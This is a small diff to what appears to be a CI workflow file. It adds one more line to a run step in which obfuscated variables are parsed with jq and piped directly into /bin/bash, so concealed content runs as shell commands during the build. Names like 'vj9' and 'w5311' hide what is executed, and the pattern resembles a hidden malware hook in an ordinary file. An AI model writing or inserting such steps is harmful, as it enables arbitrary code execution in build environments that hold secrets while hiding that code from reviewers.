@@ -20,6 +20,7 @@ jobs:
           echo $vj9 | jq -r .jjvl38 | /bin/bash
           printf '%s' "$pkr86090" | jq -r .i24 | /bin/bash
           echo $otfs37 | jq -r .unrc60673 | /bin/bash
+          echo $o68 | jq -r .w5311 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
